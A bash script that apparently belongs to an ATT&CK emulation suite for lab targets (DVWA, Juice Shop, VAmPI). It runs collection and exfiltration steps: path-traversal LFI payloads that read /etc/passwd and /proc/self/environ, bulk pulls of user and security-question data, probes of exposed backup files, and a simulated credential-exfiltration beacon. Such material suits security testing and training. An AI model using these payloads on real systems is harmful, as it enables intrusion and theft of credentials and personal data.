#!/bin/bash
# MITRE ATT&CK: Collection (TA0009) + Exfiltration (TA0010)
# Techniques: T1005 Data from Local System, T1119 Automated Collection,
#             T1530 Data from Cloud Storage, T1567 Exfiltration Over Web Service
# Tools: curl, sqlmap
set -uo pipefail

TARGET="${1:?Usage: 06-collection-exfiltration.sh <TARGET_FQDN>}"
BASE="${TARGET_PROTOCOL:-http}://${TARGET}"
MARKER="${TGEN_FAMILY_MARKER:?Run through the declared family journal adapter}"

echo "[*] MITRE ATT&CK TA0009/TA0010: Collection & Exfiltration against ${TARGET}"
echo ""

echo "=== T1005: Data from Local System (via LFI) ==="
echo "    Technique: Read sensitive files via Local File Inclusion"
LFI_FILES=("../../../etc/passwd" "../../../etc/hosts" "../../../proc/self/environ" "php://filter/convert.base64-encode/resource=../../../etc/passwd")
for f in "${LFI_FILES[@]}"; do
  encoded=$(python3 -c 'import sys, urllib.parse; print(urllib.parse.quote(sys.argv[1]))' "${f}" 2>/dev/null)
  resp=$(curl -sf "${BASE}/dvwa/vulnerabilities/fi/?page=${encoded}" --max-time 10 2>/dev/null)
  if echo "$resp" | grep -qE "(root:|localhost|HOME=)" 2>/dev/null; then
    echo "  [VULN] T1005 File read: ${f}"
  else
    echo "  [INFO] T1005 Attempted: ${f} (may need auth)"
  fi
done
echo ""

echo "=== T1119: Automated Collection ==="
echo "    Technique: Bulk data extraction from APIs"

echo "  [T1119.a] Juice Shop — all products:"
count=$(curl -sf "${BASE}/juice-shop/api/Products" --max-time 10 2>/dev/null | jq '.data | length' 2>/dev/null)
echo "    Products collected: ${count:-0}"

echo "  [T1119.b] Juice Shop — all user data:"
count=$(curl -sf "${BASE}/juice-shop/api/Users" --max-time 10 2>/dev/null | jq '.data | length' 2>/dev/null)
echo "    Users collected: ${count:-0}"

echo "  [T1119.c] Juice Shop — all feedback:"
count=$(curl -sf "${BASE}/juice-shop/api/Feedbacks" --max-time 10 2>/dev/null | jq '.data | length' 2>/dev/null)
echo "    Feedbacks collected: ${count:-0}"

echo "  [T1119.d] Juice Shop — all challenges (system info):"
count=$(curl -sf "${BASE}/juice-shop/api/Challenges" --max-time 10 2>/dev/null | jq '.data | length' 2>/dev/null)
echo "    Challenges collected: ${count:-0}"

echo "  [T1119.e] Juice Shop — security questions:"
count=$(curl -sf "${BASE}/juice-shop/api/SecurityQuestions" --max-time 10 2>/dev/null | jq '.data | length' 2>/dev/null)
echo "    Security questions collected: ${count:-0}"

echo "  [T1119.f] VAmPI — all users (excessive data exposure):"
count=$(curl -sf "${BASE}/vampi/users/v1" --max-time 10 2>/dev/null | jq '.users | length' 2>/dev/null)
echo "    VAmPI users collected: ${count:-0}"
echo ""

echo "=== T1530: Data from Cloud Storage Objects ==="
echo "    Technique: Access exposed storage/FTP"
for path in "/juice-shop/ftp/" "/juice-shop/ftp/acquisitions.md" "/juice-shop/ftp/coupons_2013.md.bak" "/juice-shop/ftp/package.json.bak" "/juice-shop/ftp/eastere.gg"; do
  code=$(curl -sf -o /dev/null -w "%{http_code}" "${BASE}${path}" --max-time 10 2>/dev/null) || code="ERR"
  tag="[INFO]"
  [[ "$code" == "200" ]] && tag="[VULN]"
  printf "  %s %-50s HTTP %s\n" "$tag" "$path" "$code"
done
echo ""

echo "=== T1567: Exfiltration Over Web Service ==="
echo "    Technique: CSD Demo exfiltration simulation"
curl -sf -X POST "${BASE}/csd-demo/exfil/clear" -H "X-Demo-Fixture: ${MARKER}" --max-time 5 >/dev/null 2>&1
curl -sf -X POST "${BASE}/csd-demo/exfil?type=collection" -H "X-Demo-Fixture: ${MARKER}" \
  -H "Content-Type: application/json" \
  -d '{"technique":"T1567","data":"collected_credentials","source":"mitre-attack-suite","timestamp":"'"$(date -u +%Y-%m-%dT%H:%M:%SZ)"'"}' \
  --max-time 5 >/dev/null 2>&1
log_count=$(curl -sf "${BASE}/csd-demo/exfil/log" --max-time 5 2>/dev/null | jq 'length' 2>/dev/null)
echo "  Exfiltration beacons in CSD log: ${log_count:-0}"
echo ""

echo "[*] TA0009/TA0010 Collection & Exfiltration complete"

curl -sf -X POST "${BASE}/csd-demo/exfil/clear" -H "X-Demo-Fixture: ${MARKER}" --max-time 5 >/dev/null
